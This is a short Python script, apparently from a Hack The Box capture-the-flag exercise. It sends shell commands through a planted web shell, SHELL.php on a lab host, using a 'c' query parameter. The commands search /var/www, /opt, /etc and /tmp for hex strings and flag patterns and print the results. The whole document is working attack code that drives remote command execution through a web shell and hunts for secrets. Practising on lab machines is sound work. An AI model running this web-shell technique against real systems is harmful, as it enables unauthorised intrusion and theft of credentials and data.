import urllib.request, urllib.parse

# Search for 32-char hex strings (HTB flag format) in readable files
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "grep -r -o -E '[a-f0-9]{32}' /var/www /opt /etc /tmp 2>/dev/null | head -20; echo '---'; grep -r -o -E 'HTB\\{[^}]+\\}' /var/www /opt /tmp 2>/dev/null | head -20; echo '---'; grep -r -o -E 'flag\\{[^}]+\\}' /var/www /opt /tmp 2>/dev/null | head -20; echo DONE"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=30)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:3000])
except Exception as e:
    print(f"Error: {e}")
